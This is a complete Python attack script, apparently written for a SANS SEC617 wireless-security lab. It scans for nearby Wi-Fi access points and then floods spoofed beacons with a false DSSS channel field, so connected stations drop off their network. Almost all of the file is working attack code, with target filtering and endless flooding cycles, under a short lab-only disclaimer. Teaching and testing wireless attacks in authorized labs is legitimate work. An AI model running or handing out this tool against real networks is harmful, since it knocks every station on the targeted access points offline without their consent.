#!/usr/bin/env python3
"""
Beacon DS-Parameter-Set *sweep* DoS.

Scans for every visible AP on a set of channels, then continuously spoofs
beacons for each one with a falsified DSSS Parameter Set IE. Stations that
trust the lie retune off-channel and lose connectivity.

How it works
------------
1. Scan: hop through the channels listed in --scan-channels (default 1,6,11),
   sniffing beacons for --dwell seconds each and collecting every unique
   (BSSID, SSID, real_channel, privacy) tuple.
2. Filter: drop targets by --include-ssid / --exclude-ssid; hidden SSIDs are
   skipped unless --include-hidden is passed.
3. Attack: group targets by their real channel, retune the interface once
   per channel, and TX a --burst of spoofed beacons per AP that advertise
   a different channel (real + 5, wrapped into 1-11, or --spoof-channel).
   Cycle indefinitely until Ctrl-C.

Requirements
------------
- Linux (uses `iw` to set the channel) and root for injection.
- The interface must already be in monitor mode (e.g. `airmon-ng start wlan0`
  or `iw dev wlan0 set type monitor`).

Authorized SANS SEC617 lab use only. Running this will degrade every Wi-Fi
network in range that isn't filtered out; only point it at networks you own
or have written permission to test.
"""

import argparse
import os
import subprocess
import sys
from dataclasses import dataclass
from typing import Optional

from scapy.all import Dot11Beacon, Dot11Elt, sendp, sniff

from beacon import build_beacon


@dataclass(frozen=True)
class Target:
    bssid: str
    ssid: bytes      # raw bytes — SSIDs aren't required to be UTF-8
    channel: int
    privacy: bool

    @property
    def ssid_display(self) -> str:
        if not self.ssid:
            return "<hidden>"
        return self.ssid.decode("utf-8", errors="replace")


def set_channel(iface: str, channel: int) -> None:
    try:
        subprocess.run(
            ["iw", "dev", iface, "set", "channel", str(channel)],
            check=True, capture_output=True, text=True,
        )
    except FileNotFoundError:
        sys.exit("error: `iw` not found. This script requires Linux + iw.")
    except subprocess.CalledProcessError as e:
        sys.exit(f"error: failed to set channel {channel} on {iface}: "
                 f"{e.stderr.strip() or e}")


def parse_beacon(pkt) -> Optional[Target]:
    if not pkt.haslayer(Dot11Beacon):
        return None
    bssid = pkt.addr3
    if not bssid:
        return None

    ssid: Optional[bytes] = None
    channel: Optional[int] = None
    layer = pkt.getlayer(Dot11Elt)
    while isinstance(layer, Dot11Elt):
        if layer.ID == 0:                       # SSID
            ssid = bytes(layer.info)
        elif layer.ID == 3 and layer.info:      # DSSS Parameter Set
            channel = layer.info[0]
        layer = layer.payload

    if ssid is None or channel is None:
        return None

    privacy = bool(int(pkt[Dot11Beacon].cap) & 0x0010)
    return Target(bssid=bssid.lower(), ssid=ssid, channel=channel, privacy=privacy)


def scan(iface: str, channels, dwell: float) -> list[Target]:
    found: dict[str, Target] = {}

    def handler(pkt):
        t = parse_beacon(pkt)
        if t is None or t.bssid in found:
            return
        found[t.bssid] = t
        priv = "(privacy)" if t.privacy else "(open)   "
        print(f"  [+] {t.bssid}  ch{t.channel:2d}  {priv}  {t.ssid_display!r}")

    for ch in channels:
        print(f"[*] Scanning channel {ch} for {dwell}s...")
        set_channel(iface, ch)
        sniff(iface=iface, prn=handler, timeout=dwell, store=False)

    return list(found.values())


def filter_targets(targets, include, exclude, include_hidden):
    out = []
    for t in targets:
        name = t.ssid_display.lower()
        if not include_hidden and not t.ssid.strip():
            continue
        if include and not any(s.lower() in name for s in include):
            continue
        if exclude and any(s.lower() in name for s in exclude):
            continue
        out.append(t)
    return out


def pick_spoof_channel(real_ch: int, override: Optional[int]) -> int:
    if override is not None:
        if override == real_ch:
            # Caller forced a no-op; nudge by 1 within 1-11.
            return (real_ch % 11) + 1
        return override
    # Shift +5 within 1-11 (the common 2.4 GHz non-DFS range) so the lie is
    # always obviously different from the real channel.
    return ((real_ch - 1 + 5) % 11) + 1


def sweep(iface: str, targets, spoof_override, burst: int, interval: float) -> None:
    by_channel: dict[int, list[Target]] = {}
    for t in targets:
        by_channel.setdefault(t.channel, []).append(t)

    cycle = 0
    while True:
        cycle += 1
        print(f"\n[*] Cycle {cycle}")
        for real_ch, group in sorted(by_channel.items()):
            set_channel(iface, real_ch)
            for t in group:
                spoof_ch = pick_spoof_channel(t.channel, spoof_override)
                print(f"    ch{real_ch:2d} -> {t.bssid} {t.ssid_display!r}  "
                      f"lying as ch{spoof_ch} ({burst} frames)")
                pkt = build_beacon(t.bssid, t.ssid, spoof_ch, t.privacy)
                sendp(pkt, iface=iface, inter=interval, count=burst, verbose=False)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-i", "--interface", required=True,
                   help="Monitor-mode interface")
    p.add_argument("--scan-channels", default="1,6,11",
                   help="Comma-separated channel list to scan (default 1,6,11)")
    p.add_argument("--dwell", type=float, default=4.0,
                   help="Seconds to sniff per channel during scan (default 4)")
    p.add_argument("--spoof-channel", type=int, default=None,
                   help="Force every spoofed beacon to advertise this channel "
                        "(1-255; values >14 are out of standard range and very "
                        "disruptive -- SEC617 example uses 238). Default: each "
                        "target's real channel + 5, wrapped 1-11.")
    p.add_argument("--burst", type=int, default=20,
                   help="Spoofed beacons per target per cycle (default 20)")
    p.add_argument("--interval", type=float, default=0.02,
                   help="Inter-beacon interval in seconds (default 0.02)")
    p.add_argument("--include-ssid", action="append", default=[],
                   help="Only attack APs whose SSID contains SUBSTR "
                        "(case-insensitive, repeatable)")
    p.add_argument("--exclude-ssid", action="append", default=[],
                   help="Skip APs whose SSID contains SUBSTR "
                        "(case-insensitive, repeatable)")
    p.add_argument("--include-hidden", action="store_true",
                   help="Also attack APs that advertise an empty/hidden SSID")
    p.add_argument("-y", "--yes", action="store_true",
                   help="Skip the confirmation prompt before flooding")
    args = p.parse_args()

    try:
        args.channels = [int(c) for c in args.scan_channels.split(",") if c.strip()]
    except ValueError:
        p.error("--scan-channels must be a comma-separated list of integers")
    if not args.channels:
        p.error("--scan-channels produced an empty list")
    if args.spoof_channel is not None and not 1 <= args.spoof_channel <= 255:
        p.error("--spoof-channel must fit in a single byte (1-255)")
    return args


def main() -> None:
    args = parse_args()
    if not sys.platform.startswith("linux"):
        sys.exit("error: this script requires Linux (uses `iw` to hop channels).")
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("warning: not running as root — channel hopping and injection "
              "will likely fail.", file=sys.stderr)

    print(f"[*] Scan on {args.interface}, channels {args.channels}, "
          f"{args.dwell}s each")
    targets = scan(args.interface, args.channels, args.dwell)
    targets = filter_targets(
        targets,
        include=args.include_ssid,
        exclude=args.exclude_ssid,
        include_hidden=args.include_hidden,
    )

    if not targets:
        sys.exit("[-] No targets after filtering. Nothing to do.")

    print(f"\n[*] {len(targets)} target(s) selected:")
    for t in targets:
        priv = "privacy" if t.privacy else "open"
        print(f"      {t.bssid}  ch{t.channel:2d}  {priv:7s}  {t.ssid_display!r}")

    if not args.yes:
        input("\nPress Enter to begin sweep (Ctrl-C to stop)...")

    try:
        sweep(args.interface, targets, args.spoof_channel,
              args.burst, args.interval)
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    main()
